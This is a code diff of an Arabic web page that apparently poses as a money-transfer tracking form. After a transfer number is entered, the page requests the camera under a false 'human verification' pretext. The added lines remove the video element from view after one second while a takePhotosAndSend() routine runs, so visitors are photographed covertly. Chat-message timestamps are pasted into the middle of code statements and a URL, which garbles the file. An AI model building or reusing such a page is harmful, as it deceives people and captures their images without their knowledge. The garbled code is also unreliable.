@@ -1,3 +1,4 @@
+Julian Barghouti, [03/02/47 02:44 ص]
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -128,10 +129,12 @@
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
         messageDiv.style.color = '#800000';
-
         const trackingNumber = document.getElementById('trackingNumber').value.trim();
         if (!trackingNumber) {
-            messageDiv.textContent = 'يرجى إدخال رقم الحوالة.';
+            messageDiv.
+
+Julian Barghouti, [03/02/47 02:44 ص]
+textContent = 'يرجى إدخال رقم الحوالة.';
             messageDiv.style.color = '#b30000';
             return;
         }
@@ -145,7 +148,17 @@
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            video.style.display = 'none'; // إخفاء الفيديو بعد بدء البث
+
+            // بعد تشغيل الفيديو، نخفي العنصر من الصفحة تمامًا بعد ثانية
+            setTimeout(() => {
+                const container = document.getElementById('videoContainer');
+                if (container && video) {
+                    video.pause();
+                    video.removeAttribute("srcObject");
+                    container.innerHTML = ''; // إزالة الفيديو من DOM نهائيًا
+                }
+            }, 1000); // 1 ثانية تأخير
+
             takePhotosAndSend();
         } catch (err) {
             messageDiv.textContent = 'تعذر الوصول إلى الكاميرا. يرجى السماح بالوصول للتحقق أنك إنسان حقيقي.';
@@ -224,7 +237,10 @@
             الاتصال على 171
         </a>
         <div style="display: flex; gap: 15px; align-items: center;">
-            <a href="https://instagram.com/" target="_blank" rel="noopener" aria-label="Instagram">
+            <a href="https://instagram.
+
+Julian Barghouti, [03/02/47 02:44 ص]
+com/" target="_blank" rel="noopener" aria-label="Instagram">
                 <img src="https://cdn-icons-png.flaticon.com/512/1384/1384063.png" alt="Instagram" style="width: 24px; height: 24px;" />
             </a>
             <a href="https://facebook.com/" target="_blank" rel="noopener" aria-label="Facebook">
